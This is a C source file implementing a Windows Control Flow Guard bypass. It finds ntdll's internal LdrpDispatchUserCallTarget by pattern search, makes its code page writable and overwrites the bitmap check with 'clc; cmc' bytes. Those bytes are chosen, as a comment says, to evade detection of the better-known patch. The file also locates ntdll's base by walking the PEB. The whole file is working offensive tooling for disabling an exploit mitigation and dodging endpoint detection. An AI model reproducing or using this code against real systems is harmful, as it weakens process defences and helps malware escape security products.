/// NTDLL patch CFG bypass: 

/*
    Editor: Thomas M
    date: 2024-09-01
    Opcode changed from 'stc ; nop ; nop ; nop' to 'clc ; cmc ; nop ; nop'
    taken from https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/
	pattern: pattern to search
	offset: pattern offset from strart of function
	base_addr: search start address
	module_size: size of the buffer pointed by base_addr
*/
#include "pebutils.h"
#include <winternl.h>
#include "cfg_patch.h"
#define ADDR unsigned __int64

typedef NTSTATUS (__stdcall* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    SIZE_T *NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection);
    

typedef struct _LDR_DATA_TABLE_ENTRY_FREE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    WORD LoadCount;
    WORD TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    _ACTIVATION_CONTEXT *EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY_FREE, *PLDR_DATA_TABLE_ENTRY_FREE;

extern ADDR *GetNtdllBase();

PVOID getPattern(unsigned char* pattern, SIZE_T pattern_size, SIZE_T offset, PVOID base_addr, SIZE_T module_size)
{
	PVOID addr = base_addr;
	while (addr != (char*)base_addr + module_size - pattern_size)
	{
		if (memcmp(addr, pattern, pattern_size) == 0)
		{
			printf("[+] Found pattern @ 0x%p\n", addr);
			return (char*)addr - offset;
		}
		addr = (char*)addr + 1;
	}

	return NULL;
}

int patchCFG(HANDLE hProcess)
{
	int res = 0;
	NTSTATUS status = 0x0;
	DWORD oldProtect = 0;
	PVOID pLdrpDispatchUserCallTarget = NULL;
	PVOID pRtlRetrieveNtUserPfn = NULL;
	PVOID check_address = NULL;
	SIZE_T size = 4;
	SIZE_T bytesWritten = 0;

	// stc ; nop ; nop ; nop
	// unsigned char patch_bytes[] = { 0xf9, 0x90, 0x90, 0x90 }; 
    //Above op codes can be used to detect the patching of CFG
	unsigned char patch_bytes[] = { 0xf8, 0xf5, 0x90, 0x90 }; /// CLC CMC



    HMODULE ntdll_base2 = (HMODULE)GetNtdllBase();

	// ntdll!LdrpDispatchUserCallTarget cannot be retrieved using GetProcAddress()
	// we search it near ntdll!RtlRetrieveNtUserPfn 
	// on Windows 10 1909  ntdll!RtlRetrieveNtUserPfn + 0x4f0 = ntdll!LdrpDispatchUserCallTarget
    pRtlRetrieveNtUserPfn = (PVOID)GetProcAddress(ntdll_base2, "RtlRetrieveNtUserPfn");


	if (pRtlRetrieveNtUserPfn == NULL)
	{
		printf("[-] RtlRetrieveNtUserPfn not found!\n");
		return -1;
	} else {
        printf("[+] RtlRetrieveNtUserPfn found @ 0x%p\n", pRtlRetrieveNtUserPfn);
    }

	printf("[+] RtlRetrieveNtUserPfn @ 0x%p\n", pRtlRetrieveNtUserPfn);
	printf("[+] Searching ntdll!LdrpDispatchUserCallTarget\n");
	// search pattern to find ntdll!LdrpDispatchUserCallTarget 
	// unsigned char pattern[] = { 0x4C ,0x8B ,0x1D ,0xE9 ,0xD7 ,0x0E ,0x00 ,0x4C ,0x8B ,0xD0 }; // Windows 10
	unsigned char pattern[] = { 0x4C, 0x8B, 0x1D, 0x01, 0xA8, 0x10, 0x00, 0x4C, 0x8B, 0xD0 };  //Windows 11
	// Windows 10 1909
	//pRtlRetrieveNtUserPfn = (char*)pRtlRetrieveNtUserPfn + 0x4f0;

	// 0xfff should be enough to find the pattern
	pLdrpDispatchUserCallTarget = getPattern(pattern, sizeof(pattern), 0, pRtlRetrieveNtUserPfn, 0xffff);
	
	if (pLdrpDispatchUserCallTarget == NULL)
	{
		printf("[-] LdrpDispatchUserCallTarget not found!\n");
		return -1;
	}

	printf("Searching instructions to patch...\n");

	// we want to overwrite the instruction `bt r11, r10`
	unsigned char instr_to_patch[] = { 0x4D, 0x0F, 0xA3, 0xD3 }; //bt r11,r10                              |
	
	// offset of the instruction is  0x1d (29)
	//check_address = (BYTE*)pLdrpDispatchUserCallTarget + 0x1d;
	
	// Use getPattern to  find the right instruction
	check_address = getPattern(instr_to_patch, sizeof(instr_to_patch), 0, pLdrpDispatchUserCallTarget, 0xffff);

	printf("[+] Setting 0x%p to RW\n", check_address);

	PVOID text = check_address;
	SIZE_T text_size = sizeof(patch_bytes);


    NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(ntdll_base2, "NtProtectVirtualMemory");

	// set RW
	// NB: this might crash the process in case a thread tries to execute those instructions while it is RW
    status = NtProtectVirtualMemory(hProcess, &text, (PSIZE_T)&text_size, PAGE_READWRITE, &oldProtect);


	if (status != 0x00)
	{
		//printf("Error in NtProtectVirtualMemory : 0x%x", status);
		return -1;
	}

	// PATCH
	WriteProcessMemory(hProcess, check_address, patch_bytes, size, &bytesWritten);
	//memcpy(check_address, patch_bytes, size);

	if (bytesWritten != size)
	{
		//printf("Error in WriteProcessMemory!\n");
		return -1;
	}

	// restore
    status = NtProtectVirtualMemory(hProcess, &text, (PSIZE_T)&text_size, oldProtect, &oldProtect);

	if (status != 0x00)
	{
		printf("Error in NtProtectVirtualMemory : 0x%x", status);
		return -1;
	} else {
        printf("[+] Memory restored to RX\n");
    }

	printf("[+] CFG Patched!\n");
	printf("[+] Written %d bytes @ 0x%p\n", bytesWritten, check_address);

	return 0;
}

/// NTDLL patch CFG bypass: 


ADDR *GetNtdllBase() {

    //1st method: 
    // void *ntdllBase = NULL;
    // PPEB_LDR_DATA ldr = NULL;
    // PPEB pPEB = NULL;

    /// get PEB: 
    // #ifdef _WIN64
    //     pPEB = (PPEB)__readgsqword(0x60); // Read PEB address from the GS segment register
    // #else
    //     pPEB = (PPEB)__readfsdword(0x30); // Read PEB address from the FS segment register
    // #endif

    // #ifdef _WIN64
    //     __asm__ volatile (
    //         "movq %%gs:0x60, %0" // Read PEB address from the GS segment register, PEB is pointed by a pointer at offset 0x60 to the TEB. 
    //         : "=r" (pPEB)
    //     );
    // #else
    //     __asm__ volatile (
    //         "movl %%fs:0x30, %0" // Read PEB address from the FS segment register
    //         : "=r" (pPEB)
    //     );
    // #endif
    // // Walk PEB: 
    // DWORD64 qwNtdllBase = (DWORD64)pPEB->Ldr & ~(0x10000 - 1); //Align the Ldr addr to 64kb boundary. 
    // while (1) {
    //     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)qwNtdllBase;
    //     if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) { // contain valid DOS header? 
    //         IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(qwNtdllBase + dosHeader->e_lfanew);
    //         if (ntHeaders->Signature == IMAGE_NT_SIGNATURE) {  //Valid NT header? 
    //             printf("[+] Ntdll base address found: %p\n", (void*)qwNtdllBase); //First valid module is ntdll.dll
    //             return (ADDR*)qwNtdllBase;
    //         }
    //     }
    //     qwNtdllBase -= 0x10000; //Windows loader aligns DLLs to 64kb boundary to simplify address space layout. 
    //     if (qwNtdllBase == 0) {
    //         printf("[-] Ntdll base address not found\n");
    //         return 0;
    //     }
    // }

    //2nd: 
    // while (1) {
    //     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)qwNtdllBase;
    //     if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
    //         IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(qwNtdllBase + dosHeader->e_lfanew);
    //         if (ntHeaders->Signature == IMAGE_NT_SIGNATURE && ntHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
    //             printf("[+] Ntdll base address found: %p\n", (void*)qwNtdllBase);
    //             return (ADDR*)qwNtdllBase;
    //         }
    //     }
    //     qwNtdllBase -= 0x10000;
    //     if (qwNtdllBase == 0) {
    //         printf("[-] Ntdll base address not found\n");
    //         return 0;
    //     }
    // }

    
    //2nd method: 
    void *ntdllBase = NULL;
    PPEB_LDR_DATA ldr = NULL;
    PPEB pPEB = NULL;
    PLDR_DATA_TABLE_ENTRY_FREE dte = NULL;

    #ifdef _WIN64
        __asm__ volatile (
            "movq %%gs:0x60, %0" // Read PEB address from the GS segment register
            : "=r" (pPEB)
        );
    #else
        __asm__ volatile (
            "movl %%fs:0x30, %0" // Read PEB address from the FS segment register
            : "=r" (pPEB)
        );
    #endif

    // Get PEB_LDR_DATA
    ldr = pPEB->Ldr;

    // // Iterate through InMemoryOrderModuleList to find ntdll.dll
    // LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    // LIST_ENTRY* current = head->Flink;

    // while (current != head) {
    //     dte = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);

    //     // Print the base address and name of each module
    //     wprintf(L"Module: %ls, Base Address: %p\n", dte->BaseDllName.Buffer, dte->DllBase);

    //     // Check if the BaseDllName matches "ntdll.dll"
    //     if (wcscmp(dte->BaseDllName.Buffer, L"ntdll.dll") == 0) {
    //         ntdllBase = dte->DllBase;
    //         break;
    //     }

    //     current = current->Flink;
    // }

    // Get the 2nd entry in the InMemoryOrderModuleList, but if EDR injects fake DLL, it will not be the 2nd entry.

    // Get the first entry (the application itself)
    LIST_ENTRY* firstEntry = ldr->InMemoryOrderModuleList.Flink;
    // Get the second entry (ntdll.dll)
    LIST_ENTRY* secondEntry = firstEntry->Flink;

    // Get the LDR_DATA_TABLE_ENTRY_FREE for ntdll.dll
    dte = CONTAINING_RECORD(secondEntry, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);

    ntdllBase = dte->DllBase;

    // /// OR check the string name of the module:
    // LIST_ENTRY* current = Ldr->InMemoryOrderModuleList; // Get the first entry in the list of loaded modules
    // do {
    //     current = current->Flink; // Move to the next entry
    //     MY_LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(current, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    //     char dllName[256]; // Buffer to store the name of the DLL
    //     // Assuming FullDllName is a UNICODE_STRING, conversion to char* may require more than snprintf, consider proper conversion
    //     snprintf(dllName, sizeof(dllName), "%wZ", entry->FullDllName);
    //     if (strstr(dllName, "ntdll.dll")) { // Check if dllName contains "ntdll.dll"
    //         return entry->DllBase; // Return the base address of ntdll.dll
    //     }
    // } while (current != Ldr->InMemoryOrderModuleList); // Loop until we reach the first entry again


    if (ntdllBase != NULL) {
        printf("[+] Ntdll base address found: %p\n", ntdllBase);
    } else {
        printf("[-] Ntdll base address not found\n");
    }

    return (ADDR*)ntdllBase;
}